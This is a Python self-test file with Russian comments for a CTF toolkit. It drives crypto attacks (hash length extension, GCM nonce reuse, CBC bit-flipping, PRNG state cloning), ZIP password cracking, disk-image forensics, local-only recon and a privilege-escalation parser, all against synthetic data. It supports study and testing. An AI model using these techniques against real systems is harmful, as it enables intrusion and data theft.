#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
selftest.py — проверка, что все скрипты кита живы и делают то, что обещают.
Запуск:  python tests/selftest.py
"""
from __future__ import annotations

# Windows: консоль/pipe не должны падать на Unicode (—, →, «», █).
try:
    import sys as _sys
    for _stream in (_sys.stdout, _sys.stderr):
        _stream.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

import io
import os
import shutil
import struct
import subprocess
import sys
import tempfile
import zipfile
import zlib
import atexit
import base64
import hashlib
import hmac
import importlib.util
import io
import json
import math
import plistlib
import random
import tarfile
import wave

from PIL import Image

KIT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PY = sys.executable
ENV = dict(os.environ, PYTHONIOENCODING="utf-8")

passed, failed = 0, 0

# настройки прогона (переопределяются аргументами командной строки)
SEED = 1234
FUZZ = 10
QUICK = False
TIMEOUT = 180


class _Result:
    def __init__(self, rc, out="", err=""):
        self.returncode = rc
        self.stdout = out
        self.stderr = err


def run(rel_script, *args, env=None, timeout=None):
    path = os.path.join(KIT, rel_script)
    e = dict(ENV)
    if env:
        e.update(env)
    try:
        return subprocess.run([PY, path, *map(str, args)], capture_output=True,
                              text=True, encoding="utf-8", errors="replace",
                              env=e, timeout=timeout or TIMEOUT)
    except subprocess.TimeoutExpired:
        return _Result(124, "", f"[timeout {timeout or TIMEOUT}s] {rel_script}")


def check(name, cond, detail=""):
    global passed, failed
    if cond:
        passed += 1
        print(f"[PASS] {name}")
    else:
        failed += 1
        print(f"[FAIL] {name}")
        if detail:
            print("       " + detail.replace("\n", "\n       ")[:1200])


HASH_INIT = {
    "md5": [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476],
    "sha1": [0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0],
    "sha256": [0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,
               0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19],
}


def _load_kit_module(rel):
    path = os.path.join(KIT, rel)
    name = "kit_" + os.path.basename(rel).replace(".", "_")
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def _our_hash(mod, alg, data):
    compress = mod.ALGS[alg][0]
    st = mod.run_state(compress, list(HASH_INIT[alg]),
                       data + mod.merkle_pad(len(data), alg == "md5"))
    return mod.digest_from_state(alg, st).hex()


def property_and_meta_checks(tmp):
    """Свойства и дифференциальные проверки, а не только заученные ответы."""
    rng = random.Random(SEED)
    steps = 3 if QUICK else FUZZ

    # 139. дифференциал: наши MD5/SHA1/SHA256 против hashlib
    hash_mod = _load_kit_module("crypto/hash_ext.py")
    bad = []
    for length in (0, 1, 3, 55, 56, 63, 64, 65, 119, 120, 200):
        data = bytes(rng.randrange(256) for _ in range(length))
        for alg, ref in (("md5", hashlib.md5), ("sha1", hashlib.sha1),
                         ("sha256", hashlib.sha256)):
            if _our_hash(hash_mod, alg, data) != ref(data).hexdigest():
                bad.append(f"{alg}/{length}")
    check("property: hash compress == hashlib", not bad,
          "рассинхрон: " + ", ".join(bad))

    # 140. length extension против hashlib на случайных данных
    fails = []
    cases = [
        (b"k", b"a", b"b"),
        (b"secretkey", b"user=guest", b"&admin=1"),
        (bytes(rng.randrange(256) for _ in range(7)),
         bytes(rng.randrange(256) for _ in range(13)),
         bytes(rng.randrange(256) for _ in range(9))),
    ][:steps]
    for key, data, append in cases:
        for alg, ref in (("md5", hashlib.md5), ("sha1", hashlib.sha1),
                         ("sha256", hashlib.sha256)):
            r = run("crypto/hash_ext.py", "length-extend", "--alg", alg,
                    "--sig", ref(key + data).hexdigest(),
                    "--data", data.hex(), "--data-hex",
                    "--append", append.hex(), "--append-hex",
                    "--key-len", len(key), "--key-hex", key.hex())
            glue = None
            for line in r.stdout.splitlines():
                if "padding (hex)" in line:
                    glue = bytes.fromhex(line.split(":", 1)[1].strip())
            real = ref(key + data + (glue or b"") + append).hexdigest()
            if real not in r.stdout or "самопроверка: ok" not in r.stdout:
                fails.append(f"{alg}/{len(data)}")
    check("property: length extension", not fails,
          "провалы: " + ", ".join(fails))

    # 141. GCM: случайные ключ/nonce/сообщения, сверка с pycryptodome
    from Crypto.Cipher import AES as _AES
    gfail = []
    for case in range(steps):
        key = bytes(rng.randrange(256) for _ in range(16))
        nonce = bytes(rng.randrange(256) for _ in range(12))
        msgs = [bytes(rng.randrange(32, 127) for _ in range(rng.randrange(4, 28)))
                for _ in range(3)]
        pairs = []
        for m in msgs:
            cipher = _AES.new(key, _AES.MODE_GCM, nonce=nonce)
            pairs.append(cipher.encrypt_and_digest(m))
        true_h = int.from_bytes(
            _AES.new(key, _AES.MODE_ECB).encrypt(b"\x00" * 16), "big")
        args = ["gcm-nonce-reuse"]
        for i, (ct, tag) in enumerate(pairs, 1):
            args += [f"--ct{i}", ct.hex(), f"--tag{i}", tag.hex()]
        args += ["--pt1", msgs[0].hex(), "--pt1-hex"]
        r = run("crypto/hash_ext.py", *args)
        prefix = min(len(msgs[0]), len(msgs[1]))
        if (f"{true_h:032x}" not in r.stdout
                or msgs[1][:prefix].hex() not in r.stdout):
            gfail.append(f"case{case}")
    check("property: GCM nonce reuse", not gfail, "провалы: " + ", ".join(gfail))

    # 142. CBC flip: iv ^ known ^ target
    flip_bad = []
    for _ in range(steps):
        iv = bytes(rng.randrange(256) for _ in range(16))
        known = bytes(rng.randrange(256) for _ in range(16))
        target = bytes(rng.randrange(256) for _ in range(16))
        r = run("crypto/block_oracles.py", "cbc-flip", "--iv", iv.hex(),
                "--known", known.hex(), "--target", target.hex())
        expect = bytes(a ^ b ^ c for a, b, c in zip(iv, known, target)).hex()
        if expect not in r.stdout:
            flip_bad.append(iv.hex()[:8])
    check("property: cbc-flip", not flip_bad, "провалы: " + ", ".join(flip_bad))

    # 143. фаззинг: carve не падает и не висит на обрезанных файлах
    src = os.path.join(tmp, "fuzz_carve.png")
    Image.new("RGB", (8, 8), (1, 2, 3)).save(src)
    raw = open(src, "rb").read()
    crash = []
    for i in range(min(steps, 8)):
        cut = rng.randrange(1, len(raw))
        p = os.path.join(tmp, f"fuzz_{i}.png")
        open(p, "wb").write(raw[:cut])
        r = run("stego/carve.py", p, "--out", os.path.join(tmp, f"carve_{i}"))
        if "Traceback" in (r.stderr or "") or r.returncode not in (0, 1, 2):
            crash.append(f"{cut}:{r.returncode}")
    check("fuzz: carve truncation", not crash, "падения: " + ", ".join(crash))

    # 144. мета: реестр согласован с файлами
    tb = _load_kit_module("toolbox.py")
    missing = []
    for _sec, name, rel, _desc in tb.REGISTRY:
        if rel and not os.path.exists(os.path.join(KIT, rel)):
            missing.append(f"{name}->{rel}")
    check("meta: REGISTRY files exist", not missing, ", ".join(missing))

    # 145. мета: новые инструменты описаны в INDEX
    idx = open(os.path.join(KIT, "INDEX.md"), encoding="utf-8").read()
    absent = [n for n in ("oracles", "hashext") if f"`{n}`" not in idx]
    check("meta: INDEX описывает новые инструменты", not absent,
          ", ".join(absent))


def write_png_with_lsb(path, message: bytes):
    w, h = 240, 30
    im = Image.new("RGB", (w, h), (128, 0, 0))
    px = im.load()
    bits = [(b >> (7 - i)) & 1 for b in message for i in range(8)]
    idx = 0
    for y in range(h):
        for x in range(w):
            if idx >= len(bits):
                break
            r, g, b = px[x, y]
            px[x, y] = ((r & 0xFE) | bits[idx], g, b)
            idx += 1
    im.save(path)


def write_alpha_png(path, message: bytes):
    w, h = 240, 30
    im = Image.new("RGBA", (w, h), (10, 20, 30, 255))
    px = im.load()
    for i, b in enumerate(message):
        x, y = i % w, i // w
        px[x, y] = (10, 20, 30, b)
    im.save(path)


def make_zip_bytes(name="a.txt", data=b"hello", comment=b""):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr(name, data)
        if comment:
            z.comment = comment
    return buf.getvalue()


def checks_ctb(tmp):
    """ctb: recon по локальным фейковым сервисам, plan, log, разбор privesc."""
    import http.server
    import secrets
    import socket
    import threading

    flag = "CTF{ctb_" + secrets.token_hex(4) + "}"

    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path == "/robots.txt":
                body = f"User-agent: *\nDisallow: /{flag}\n".encode()
            else:
                body = b"<html><head><title>CtbLab</title></head></html>"
            self.send_response(200)
            self.send_header("Server", "LabHTTP/1.0")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *a):
            pass

    httpd = http.server.HTTPServer(("127.0.0.1", 0), H)
    hport = httpd.server_address[1]
    ftp = socket.socket()
    ftp.bind(("127.0.0.1", 0))
    ftp.listen(5)
    fport = ftp.getsockname()[1]
    stop = threading.Event()

    def ftp_loop():
        ftp.settimeout(0.3)
        while not stop.is_set():
            try:
                c, _ = ftp.accept()
            except OSError:
                continue
            try:
                c.sendall(b"220 (vsFTPd 2.3.4)\r\n")
            except OSError:
                pass
            c.close()

    ts = [threading.Thread(target=httpd.serve_forever, daemon=True),
          threading.Thread(target=ftp_loop, daemon=True)]
    for t in ts:
        t.start()
    try:
        rep_path = os.path.join(tmp, "ctb_report.json")
        r = run("ctb/ctb.py", "recon", "127.0.0.1", "--ports",
                f"{fport},{hport}", "--timeout", "1", "--out", rep_path)
        check("ctb recon: баннер FTP", "vsFTPd 2.3.4" in r.stdout, r.stdout[-500:] + r.stderr)
        check("ctb recon: title/Server", "CtbLab" in r.stdout and "LabHTTP" in r.stdout,
              r.stdout[-500:] + r.stderr)
        check("ctb recon: флаг из robots.txt", flag in r.stdout, r.stdout[-500:] + r.stderr)
        check("ctb recon: заметка по версии", "бэкдор" in r.stdout, r.stdout[-500:])
        r = run("ctb/ctb.py", "recon", "127.0.0.0/24")
        check("ctb recon: диапазоны отвергаются", "[-]" in r.stdout and '"open"' not in r.stdout,
              r.stdout + r.stderr)
        r = run("ctb/ctb.py", "plan", rep_path)
        check("ctb plan", "Чек-лист" in r.stdout and "ftp" in r.stdout.lower(),
              r.stdout + r.stderr)
    finally:
        stop.set()
        httpd.shutdown()
        httpd.server_close()
        ftp.close()
        for t in ts:
            t.join(2)

    # журнал
    logf = os.path.join(tmp, "ctb_log.jsonl")
    env = {"CTB_LOG": logf}
    run("ctb/ctb.py", "log", "add", "ftp anon", "--result", "ok", "--note", "n1", env=env)
    r = run("ctb/ctb.py", "log", "show", env=env)
    rec = json.loads(open(logf, encoding="utf-8").readline())
    check("ctb log", "ftp anon" in r.stdout and rec["result"] == "ok" and rec["note"] == "n1",
          r.stdout + r.stderr)

    # privesc
    sample = os.path.join(tmp, "privesc_sample.txt")
    open(sample, "w", encoding="utf-8").write(
        "===== 1. Кто я =====\nuid=1000(bob)\n"
        "Linux box 4.4.0-31-generic #50 SMP x86_64 GNU/Linux\n\n"
        "===== 2. sudo =====\n"
        "User bob may run the following commands on box:\n"
        "    (root) NOPASSWD: /usr/bin/vim\n\n"
        "===== 3. SUID / SGID =====\n/usr/bin/passwd\n/usr/bin/find\n/bin/su\n"
        "--- SGID ---\n\n"
        "===== 4. Capabilities =====\n/usr/bin/python3 = cap_setuid+ep\n")
    r = run("ctb/ctb.py", "privesc", sample)
    check("ctb privesc parse",
          "NOPASSWD: /usr/bin/vim" in r.stdout and "/usr/bin/find" in r.stdout
          and "cap_setuid" in r.stdout and "4.4.0" in r.stdout
          and "SUID (необычный): /usr/bin/passwd" not in r.stdout,
          r.stdout + r.stderr)
    r = run("ctb/ctb.py", "privesc")
    check("ctb privesc howto", "privesc.sh" in r.stdout, r.stdout + r.stderr)
def zipcrypto_zip(name, body, pwd):
    """Минимальный ZipCrypto-шифратор (stored) для теста."""
    tab = []
    for n in range(256):
        c = n
        for _ in range(8):
            c = (c >> 1) ^ 0xEDB88320 if c & 1 else c >> 1
        tab.append(c)

    def upd(crc, b):
        return (crc >> 8) ^ tab[(crc ^ b) & 0xFF]
    k = [0x12345678, 0x23456789, 0x34567890]

    def feed(b):
        k[0] = upd(k[0], b)
        k[1] = ((k[1] + (k[0] & 0xFF)) * 134775813 + 1) & 0xFFFFFFFF
        k[2] = upd(k[2], k[1] >> 24)
    for ch in pwd:
        feed(ch)
    crc = zlib.crc32(body) & 0xFFFFFFFF
    plain = bytes(range(11)) + bytes([crc >> 24])
    enc = bytearray()
    for b in plain + body:
        t = (k[2] | 2) & 0xFFFF
        ks = ((t * (t ^ 1)) >> 8) & 0xFF
        enc.append(b ^ ks)
        feed(b)
    nb = name.encode()
    lh = struct.pack("<4sHHHHHIIIHH", b"PK\x03\x04", 20, 1, 0, 0, 0x21, crc,
                     len(enc), len(body), len(nb), 0) + nb
    cd = struct.pack("<4s6H3I5H2I", b"PK\x01\x02", 20, 20, 1, 0, 0, 0x21, crc,
                     len(enc), len(body), len(nb), 0, 0, 0, 0, 0, 0) + nb
    eocd = struct.pack("<4s4H2IH", b"PK\x05\x06", 0, 0, 1, 1, len(cd),
                       len(lh) + len(enc), 0)
    return lh + bytes(enc) + cd + eocd


def checks_zip_tricks(tmp):
    import random
    rnd = random.Random(99)
    flag = "CTF{zt_" + "".join(rnd.choice("abcdefghijklmnop0123456789") for _ in range(10)) + "}"
    # 1. fakecrypt: бит шифрования стоит, данные открыты
    buf = bytearray(make_zip_bytes("flag.txt", flag.encode()))
    lh = buf.find(b"PK\x03\x04")
    cd = buf.find(b"PK\x01\x02")
    struct.pack_into("<H", buf, lh + 6, struct.unpack_from("<H", buf, lh + 6)[0] | 1)
    struct.pack_into("<H", buf, cd + 8, struct.unpack_from("<H", buf, cd + 8)[0] | 1)
    fz = os.path.join(tmp, "zt_fake.zip")
    with open(fz, "wb") as f:
        f.write(buf)
    out = os.path.join(tmp, "zt_fake_out")
    r = run("forensic/zip_tricks.py", "fakecrypt", fz, "--out", out)
    got = ""
    try:
        got = open(os.path.join(out, "flag.txt"), encoding="utf-8").read()
    except OSError:
        pass
    check("forensic/zip_tricks.py fakecrypt", got == flag and flag in r.stdout, r.stdout + r.stderr)
    r = run("forensic/zip_tricks.py", "info", fz)
    check("forensic/zip_tricks.py info", "flag.txt" in r.stdout and "encCD" in r.stdout,
          r.stdout + r.stderr)
    # 2. crc-brute: флаг разрезан на куски по 1-4 байта
    cut, i = [], 0
    while i < len(flag):
        n = rnd.randint(1, 4)
        cut.append(flag[i:i + n].encode())
        i += n
    bz = os.path.join(tmp, "zt_split.zip")
    with zipfile.ZipFile(bz, "w", zipfile.ZIP_STORED) as z:
        for j, part in enumerate(cut):
            z.writestr(f"{j:03d}.txt", part)
    r = run("forensic/zip_tricks.py", "crc-brute", bz)
    check("forensic/zip_tricks.py crc-brute", flag in r.stdout, r.stdout[-600:] + r.stderr)
    # 3. password: ZipCrypto
    pw = "s3cret" + str(rnd.randint(10, 99))
    pz = os.path.join(tmp, "zt_pw.zip")
    with open(pz, "wb") as f:
        f.write(zipcrypto_zip("f.txt", flag.encode(), pw.encode()))
    wl = os.path.join(tmp, "zt_words.txt")
    with open(wl, "w") as f:
        f.write("nope\nadmin\n" + pw + "\nlast\n")
    r = run("forensic/zip_tricks.py", "password", pz, "--wordlist", wl)
    check("forensic/zip_tricks.py password", f"пароль: {pw}" in r.stdout and flag in r.stdout,
          r.stdout + r.stderr)
    r = run("forensic/zip_tricks.py", "known-plaintext", pz, "--magic", "png")
    check("forensic/zip_tricks.py known-plaintext", "bkcrack" in r.stdout, r.stdout + r.stderr)
def _mk_fat16(flag_live, flag_del):
    """FAT16 ~2 МБ: normal.txt (живой) и gone.txt (удалён, цепочка FAT обнулена)."""
    bps, spc, rsv, nf, fsz, rootn = 512, 1, 1, 2, 17, 512
    ncl = 4100
    root_secs = rootn * 32 // bps
    total = rsv + nf * fsz + root_secs + ncl
    img = bytearray(total * bps)
    bs = bytearray(512)
    bs[0:3] = b"\xeb\x3c\x90"
    bs[3:11] = b"MSDOS5.0"
    struct.pack_into("<HBHBHHBHHHII", bs, 11, bps, spc, rsv, nf, rootn, total, 0xF8, fsz, 32, 2, 0, 0)
    bs[54:62] = b"FAT16   "
    bs[510:512] = b"\x55\xaa"
    img[0:512] = bs
    fat0 = rsv * bps
    struct.pack_into("<HHHH", img, fat0, 0xFFF8, 0xFFFF, 0xFFFF, 0xFFFF)  # кластеры 2 (live)
    root = (rsv + nf * fsz) * bps
    data0 = (rsv + nf * fsz + root_secs) * bps

    def ent(name, ext, clu, size, first=None):
        e = bytearray(32)
        e[0:8], e[8:11] = name.ljust(8).encode(), ext.ljust(3).encode()
        e[11] = 0x20
        struct.pack_into("<H", e, 26, clu)
        struct.pack_into("<I", e, 28, size)
        if first is not None:
            e[0] = first
        return bytes(e)
    img[root:root + 32] = ent("NORMAL", "TXT", 2, len(flag_live))
    img[root + 32:root + 64] = ent("GONE", "TXT", 3, len(flag_del), first=0xE5)
    img[data0:data0 + len(flag_live)] = flag_live
    img[data0 + bps:data0 + bps + len(flag_del)] = flag_del  # кластер 3, в FAT не занят
    return bytes(img)


def _mk_mft(flag, ads_flag):
    """$MFT из 2 записей по 1024: #0 пропускается, #1 — файл с resident $DATA + ADS."""
    def attr(atype, content, name=""):
        nm = name.encode("utf-16-le")
        hdr = 24 + len(nm)
        hdr += -hdr % 8
        body = content + b"\0" * (-len(content) % 8)
        a = bytearray(hdr + len(body))
        struct.pack_into("<IIBBHHH", a, 0, atype, len(a), 0, len(name), 24, 0, 0)
        struct.pack_into("<IH", a, 16, len(content), hdr)
        a[24:24 + len(nm)] = nm
        a[hdr:hdr + len(body)] = body
        return bytes(a)

    def record(fname, streams, inuse):
        r = bytearray(1024)
        r[0:4] = b"FILE"
        struct.pack_into("<HH", r, 4, 0x30, 3)
        struct.pack_into("<H", r, 0x14, 0x38)
        struct.pack_into("<H", r, 0x16, 1 if inuse else 0)
        fn = bytearray(0x42) + fname.encode("utf-16-le")
        struct.pack_into("<Q", fn, 0, 5)
        fn[0x40], fn[0x41] = len(fname), 1
        body = attr(0x30, bytes(fn))
        for nm, d in streams:
            body += attr(0x80, d, nm)
        body += b"\xff\xff\xff\xff"
        r[0x38:0x38 + len(body)] = body
        r[0x30:0x32] = b"\x01\x00"  # USN
        for i in (1, 2):  # fixup: хвосты секторов заменены на USN
            r[0x32 + (i - 1) * 2:0x34 + (i - 1) * 2] = bytes(r[i * 512 - 2:i * 512])
            r[i * 512 - 2:i * 512] = b"\x01\x00"
        return bytes(r)
    return (record("$MFT", [("", b"")], True)
            + record("secret.txt", [("", b"plain\n"), ("hidden", ads_flag)], False)
            + record("note.txt", [("", flag)], True))


def _mk_ext(flag):
    """Минимальный ext2 (1 КБ блок): superblock + 1 группа + корень с файлом."""
    img = bytearray(64 * 1024)
    sb = 1024
    struct.pack_into("<IIIII", img, sb, 32, 64, 3, 40, 20)  # inodes, blocks, rsv, free blk, free ino
    struct.pack_into("<IIII", img, sb + 0x14, 1, 0, 8192, 8192)
    struct.pack_into("<I", img, sb + 0x28, 32)
    struct.pack_into("<H", img, sb + 0x38, 0xEF53)
    struct.pack_into("<HH", img, sb + 0x3A, 1, 1)
    struct.pack_into("<I", img, sb + 0x4C, 1)
    struct.pack_into("<H", img, sb + 0x58, 128)
    img[sb + 0x78:sb + 0x80] = b"CTFEXT\0\0"
    struct.pack_into("<I", img, 2048 + 8, 5)  # дескриптор группы: inode table в блоке 5
    it = 5 * 1024

    def put_inode(n, mode, size, blk):
        o = it + (n - 1) * 128
        struct.pack_into("<HH", img, o, mode, 0)
        struct.pack_into("<I", img, o + 4, size)
        struct.pack_into("<H", img, o + 0x1A, 1)
        struct.pack_into("<I", img, o + 0x28, blk)
    put_inode(2, 0x41ED, 1024, 20)
    put_inode(12, 0x81A4, len(flag), 21)
    d = bytearray(1024)
    off = 0
    for ino, nm in ((2, b"."), (2, b".."), (12, b"flag.txt")):
        rl = 1024 - off if nm == b"flag.txt" else 12
        struct.pack_into("<IHBB", d, off, ino, rl, len(nm), 0)
        d[off + 8:off + 8 + len(nm)] = nm
        off += rl
    img[20 * 1024:21 * 1024] = d
    img[21 * 1024:21 * 1024 + len(flag)] = flag
    return bytes(img)


def checks_disk_image(tmp):
    d = os.path.join(tmp, "diskimg")
    os.makedirs(d, exist_ok=True)
    gone = b"CTF{deleted_fat16_file}"
    fat = os.path.join(d, "fat16.img")
    open(fat, "wb").write(_mk_fat16(b"hello world\n", gone))
    r = run("forensic/disk_image.py", "fat", fat, "--find-flags", "--out", os.path.join(d, "fatout"))
    check("disk_image fat: удалённый файл и флаг",
          "FAT16" in r.stdout and "DEL" in r.stdout and "_ONE.TXT" in r.stdout
          and gone.decode() in r.stdout, r.stdout[-600:] + r.stderr)
    dd = os.path.join(d, "fatout", "[deleted]")
    check("disk_image fat: --out", os.path.isdir(dd) and any(
        open(os.path.join(dd, n), "rb").read().startswith(b"CTF{deleted") for n in os.listdir(dd)))

    mf = os.path.join(d, "mft.bin")
    mflag, aflag = b"CTF{mft_resident_data}", b"CTF{ads_stream_hidden}"
    open(mf, "wb").write(_mk_mft(mflag, aflag))
    r = run("forensic/disk_image.py", "mft", mf, "--find-flags")
    check("disk_image mft: ADS + resident + deleted",
          "[ADS]" in r.stdout and "secret.txt:hidden" in r.stdout and "DELETED" in r.stdout
          and mflag.decode() in r.stdout and aflag.decode() in r.stdout, r.stdout[-600:] + r.stderr)

    ex = os.path.join(d, "ext.img")
    eflag = b"CTF{ext_file_content}"
    open(ex, "wb").write(_mk_ext(eflag))
    r = run("forensic/disk_image.py", "ext", ex, "--find-flags")
    check("disk_image ext: суперблок и файл",
          "0xEF53" in r.stdout and "inodes 32" in r.stdout and "blocks 64" in r.stdout
          and "ext2" in r.stdout and "flag.txt" in r.stdout and eflag.decode() in r.stdout,
          r.stdout[-600:] + r.stderr)

    # MBR с одним FAT-разделом + scan
    disk = os.path.join(d, "disk.img")
    fb = _mk_fat16(b"x", b"CTF{scan_via_mbr_part}")
    mbr = bytearray(512)
    mbr[446:462] = bytes([0x80, 0, 2, 0, 0x0E, 0xFF, 0xFF, 0xFF]) + struct.pack("<II", 63, len(fb) // 512)
    mbr[510:512] = b"\x55\xaa"
    open(disk, "wb").write(bytes(mbr) + b"\0" * (62 * 512) + fb)
    r = run("forensic/disk_image.py", "parts", disk)
    check("disk_image parts: MBR FAT16 LBA", "FAT16 LBA" in r.stdout and " 63 " in r.stdout
          and "MBR" in r.stdout, r.stdout + r.stderr)
    r = run("forensic/disk_image.py", "scan", disk, "--find-flags")
    check("disk_image scan: раздел -> FAT -> флаг", "CTF{scan_via_mbr_part}" in r.stdout,
          r.stdout[-600:] + r.stderr)
def checks_prng(tmp):
    import random as _rnd
    # MT19937: 624 выходов -> клон -> следующие и предыдущие
    rng = _rnd.Random(20240607)
    seq = [rng.getrandbits(32) for _ in range(800)]
    f = os.path.join(tmp, "mt_outs.txt")
    open(f, "w").write(" ".join(map(str, seq[100:724])))      # окно не с границы блока
    r = run("crypto/prng_state.py", "mt", f, "--n", "6", "--prev", "4")
    check("prngstate mt: следующие выходы",
          str(seq[724:730]) in r.stdout, r.stdout[-500:] + r.stderr)
    check("prngstate mt: предыдущие выходы",
          str(seq[96:100]) in r.stdout, r.stdout[-500:] + r.stderr)
    # шифртекст XOR randbytes -> флаг
    pt = b"CTF{mt_cloned_ok}"
    rng2 = _rnd.Random(99)
    outs2 = [rng2.getrandbits(32) for _ in range(624)]
    key = rng2.randbytes(len(pt))
    f2 = os.path.join(tmp, "mt_outs2.txt")
    open(f2, "w").write(" ".join(map(str, outs2)))
    r = run("crypto/prng_state.py", "mt", f2, "--cipher", bytes(a ^ b for a, b in zip(pt, key)).hex())
    check("prngstate mt: --cipher randbytes", "CTF{mt_cloned_ok}" in r.stdout, r.stdout[-500:])
    # LCG с неизвестными m, a, c
    m, a, c, x = 2 ** 31 - 1, 1103515245, 12345, 42
    xs = []
    for _ in range(12):
        x = (a * x + c) % m
        xs.append(x)
    f3 = os.path.join(tmp, "lcg_outs.txt")
    open(f3, "w").write(" ".join(map(str, xs[:9])))
    r = run("crypto/prng_state.py", "lcg", f3, "--n", "3")
    check("prngstate lcg: m, a, c и следующий",
          f"m = {m}" in r.stdout and f"a = {a}" in r.stdout and f"c = {c}" in r.stdout
          and str(xs[9:12]) in r.stdout, r.stdout[-500:] + r.stderr)
    # LCG с усечёнными выходами (стиль java.util.Random: 48 бит, старшие 32)
    m, a, c, x = 2 ** 48, 25214903917, 11, 123456789012
    full = []
    for _ in range(12):
        x = (a * x + c) % m
        full.append(x)
    f4 = os.path.join(tmp, "lcgt_outs.txt")
    open(f4, "w").write(" ".join(str(v >> 16) for v in full[:8]))
    r = run("crypto/prng_state.py", "lcg-trunc", f4, "--m", m, "--a", a, "--c", c,
            "--shift", 16, "--n", "3")
    check("prngstate lcg-trunc: состояние и следующие",
          str([v >> 16 for v in full[8:11]]) in r.stdout, r.stdout[-500:] + r.stderr)
def checks_forensics(tmp):
    """Регрессии forensic/* (#67-#74): каждый артефакт строится здесь же."""
    base = os.path.join(tmp, "forensics_regress")
    os.makedirs(base, exist_ok=True)

    # #67 git_hunt: dangling-объекты (loose и в pack) читаются, а .git
    # задачи не меняется (раньше fsck --lost-found писал в .git/lost-found)
    repo = os.path.join(base, "gitrepo")
    os.makedirs(repo)

    def _g(*a, data=None):
        return subprocess.run(["git", "-C", repo, *a], input=data,
                              capture_output=True, check=True)
    _g("init", "-q")
    _g("config", "user.email", "a@b.c")
    _g("config", "user.name", "a")
    open(os.path.join(repo, "readme.txt"), "w").write("nothing here\n")
    _g("add", ".")
    _g("commit", "-qm", "init")
    _g("hash-object", "-w", "--stdin", data=b"CTF{git_packed_dangling}\n")
    _g("repack", "-a", "-d", "-k", "-q")
    _g("hash-object", "-w", "--stdin", data=b"CTF{git_loose_dangling}\n")

    def _tree(root):
        return sorted(os.path.relpath(os.path.join(dp, f), root)
                      for dp, dn, fn in os.walk(root) for f in fn + dn)
    before = _tree(os.path.join(repo, ".git"))
    r = run("forensic/git_hunt.py", repo)
    after = _tree(os.path.join(repo, ".git"))
    check("git_hunt dangling blobs (#67)",
          "CTF{git_packed_dangling}" in r.stdout
          and "CTF{git_loose_dangling}" in r.stdout, r.stdout[-800:] + r.stderr)
    check("git_hunt read-only (#67)", before == after,
          str(sorted(set(after) ^ set(before)))[:400])

    # #68 windows_triage: флаг в UTF-16LE и отчёт о файлах сверх --limit
    hive = os.path.join(base, "SOFTWARE")
    open(hive, "wb").write(b"regf\x00\x01" + "CTF{utf16_hive}".encode("utf-16-le")
                           + b"\x00\x00\xff")
    r = run("forensic/windows_triage.py", hive)
    check("windows_triage utf16 flag (#68)", "CTF{utf16_hive}" in r.stdout,
          r.stdout[-600:] + r.stderr)
    many = os.path.join(base, "evtx_dump")
    os.makedirs(many)
    for i in range(105):
        open(os.path.join(many, f"log{i:03d}.txt"), "w").write("nothing\n")
    open(os.path.join(many, "log104.txt"), "w").write("CTF{after_limit}\n")
    r = run("forensic/windows_triage.py", many)
    check("windows_triage reports skipped (#68)",
          "пропущено файлов: 5 " in r.stdout and "--limit" in r.stdout,
          r.stdout[-600:] + r.stderr)
    r = run("forensic/windows_triage.py", many, "--limit", "0")
    check("windows_triage --limit 0 (#68)", "CTF{after_limit}" in r.stdout,
          r.stdout[-600:] + r.stderr)

    # #69 docker_image: относительный --out и whiteout в корне слоя
    def _layer(files):
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w") as t:
            for n, d in files.items():
                ti = tarfile.TarInfo(n)
                ti.size = len(d)
                t.addfile(ti, io.BytesIO(d))
        return buf.getvalue()
    dimg = os.path.join(base, "img.tar")
    with tarfile.open(dimg, "w") as t:
        for n, d in (
                ("manifest.json", json.dumps([{"Config": "c.json",
                                               "Layers": ["a/layer.tar", "b/layer.tar"]}]).encode()),
                ("c.json", b'{"config": {}}'),
                ("a/layer.tar", _layer({"rootflag.txt": b"CTF{docker_root_wh}\n",
                                        "app/data.txt": b"keep\n",
                                        ".env": b"MODE=test\n"})),
                ("b/layer.tar", _layer({".wh.rootflag.txt": b""}))):
            ti = tarfile.TarInfo(n)
            ti.size = len(d)
            t.addfile(ti, io.BytesIO(d))
    r = subprocess.run([PY, os.path.join(KIT, "forensic", "docker_image.py"), dimg,
                        "--out", "fsout"], cwd=base, capture_output=True, text=True,
                       encoding="utf-8", errors="replace", env=ENV)
    fsout = os.path.join(base, "fsout")
    check("docker_image relative --out (#69)",
          os.path.isfile(os.path.join(fsout, "app", "data.txt"))
          and os.path.isfile(os.path.join(fsout, ".env")),
          r.stdout[-600:] + r.stderr)
    check("docker_image root whiteout (#69)",
          "- rootflag.txt" in r.stdout and "CTF{docker_root_wh}" in r.stdout
          and not os.path.exists(os.path.join(fsout, "rootflag.txt"))
          and not os.path.exists(os.path.join(fsout, "wh.rootflag.txt")),
          r.stdout[-600:] + r.stderr)

    # #70 exif без exiftool (PATH без него): Exif sub-IFD, GPS, COM, XP*
    jpg = os.path.join(base, "meta.jpg")
    _ex = Image.Exif()
    _ex[0x010E] = "CTF{exif_description}"
    _ex[0x9C9C] = "CTF{exif_xpcomment}".encode("utf-16-le") + b"\x00\x00"
    _ex.get_ifd(0x8769)[0x9286] = b"ASCII\x00\x00\x00CTF{exif_usercomment}"
    _gps = _ex.get_ifd(0x8825)
    _gps[1], _gps[2] = "N", (55.0, 45.0, 0.0)
    _gps[3], _gps[4] = "E", (37.0, 37.0, 0.0)
    Image.new("RGB", (8, 8), (1, 2, 3)).save(jpg, exif=_ex, comment=b"CTF{exif_jpeg_com}")
    r = run("forensic/exif.py", jpg, env={"PATH": base})
    check("exif without exiftool (#70)",
          all(x in r.stdout for x in ("CTF{exif_description}", "CTF{exif_xpcomment}",
                                      "CTF{exif_usercomment}", "CTF{exif_jpeg_com}",
                                      "55.75")), r.stdout[-800:] + r.stderr)

